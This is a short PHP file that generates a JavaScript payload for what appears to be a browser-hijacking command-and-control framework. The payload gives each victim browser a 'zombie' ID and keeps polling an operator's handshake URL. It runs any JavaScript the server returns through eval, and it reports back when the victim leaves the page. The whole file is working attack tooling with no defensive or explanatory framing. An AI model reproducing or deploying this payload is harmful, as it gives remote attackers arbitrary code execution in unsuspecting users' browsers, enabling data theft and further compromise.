<?php
/*
Page: Payload
*/

require_once('./includes/functions.php');
header("content-type: application/javascript");

$uniqueid = $_GET['uid'];
$exit = ($killuponexit ? "window.onunload = function() {offline(zombieid, '$uniqueid');}" : "");

echo <<<JSPAYLOAD
function randomString(len) {
    charSet = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789';
    var randomString = '';
    for (var i = 0; i < len; i++) {
    	var randomPoz = Math.floor(Math.random() * charSet.length);
    	randomString += charSet.substring(randomPoz,randomPoz+1);
    }
    return randomString;
}

function callback(victimid) {
	var uniqueid = "$uniqueid";
	$.ajax({
		type: "POST",
		url: "$handshakeurl",
		data: {
			do:"callback",
			uid:uniqueid,
			vid:victimid
		},
		cache: false,
		success: function(response) {
			console.log('This is the online request callback');
			if(response) {
				var json = jQuery.parseJSON(response);
				eval(json.js);
			}
			setTimeout(function() {callback(victimid)}, $zombierefreshrate);
		}
	});
}

function check_status(uid) {
	$.ajax({
		type: "POST",
		url: "$handshakeurl",
		data: {
			do:"check_zombie_status",
			uid:uid
		},
		cache: false,
		async: false,
		success: function(response) {
			console.log(response);
			var json = jQuery.parseJSON(response);
			if(json.status == 1) {
				zid = json.zid;
			} else {
				zid = randomString($zidlength);
			}
		}
	});
	return zid;
}

function offline(zombieid, uid) {
	console.log('LOLOL');
	$.ajax({
		type: "POST",
		url: "$handshakeurl",
		data: {
			do:"offline",
			uid:uid,
			vid:zombieid
		},
		cache: false,
		success: function(response) {
			console.log('This is the offline request callback');
		}
	});
}

var zombieid = check_status('$uniqueid');
callback(zombieid);

$exit
JSPAYLOAD;

?>